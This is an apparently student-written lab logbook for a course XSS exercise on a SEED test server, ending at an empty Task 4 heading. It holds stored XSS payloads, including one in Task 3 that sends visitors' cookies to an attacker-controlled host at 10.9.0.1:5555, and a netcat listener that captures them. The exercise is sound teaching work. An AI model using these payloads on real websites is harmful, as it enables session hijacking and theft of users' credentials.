## Task 1

First we logged in ```http://www.seed-server.com/```with the user ```alice``` and the corresponding password - ```seedalice```.
Then, in the profile page, we edit the ```Brief description``` to ```<script>alert(’XSS’);</script>```.

![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task1_logbook7.png)

After making that change, when any user visits that profile, that code will be executed and an alert window will be displayed.

![Image 2.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task1_logbook7_2.png)

## Task 2

 We changed the  ```Brief description``` to ```<script>alert(document.cookie);</script>```.

 ![Image 3.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7.png)

 After making the change, when viewing the profile, an alert window was displayed showing the cookies of the user who viewed the profile.

 - Login as ```alice```:
  ![Image 4.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7_2.png)
 - Login as ```boby```:
   ![Image 5.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task2_logbook7_3.png)

## Task 3
 We changed the  ```Brief description``` to ```<script>document.write(’<img src=http://10.9.0.1:5555?c=’+ escape(document.cookie) + ’ >’);</script>```.
   ![Image 6.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task3_logbook7.png)
   Then we used the command ```nc -lknv 5555```to start a server that listens on port 5555, then we visited ```alice```'s profile logged as ```alice``` and then logged as ```boby```:
      ![Image 7.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/task3_logbook7_1.png)
    That way, as the attacker, we were able to see the users cockies.

## Task 4
